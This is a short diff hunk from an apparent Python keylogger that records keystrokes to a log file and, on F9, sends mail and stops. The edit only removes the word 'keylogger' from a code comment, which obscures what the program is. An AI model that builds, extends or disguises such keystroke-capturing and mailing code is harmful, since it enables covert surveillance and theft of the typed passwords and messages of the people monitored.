@@ -54,7 +54,7 @@ def keyboard_press(key: Key) -> None:
   # This can cause AttributeError (if it's a special key)
   except AttributeError:
 
-    # Press F9 -> send mail AND terminate keylogger
+    # Press F9 -> send mail AND terminate
     if key == Key.f9:
       log_f.write(f"\n\n「Keylogger terminated {get_time(day=True)}」")
       exit_ = True
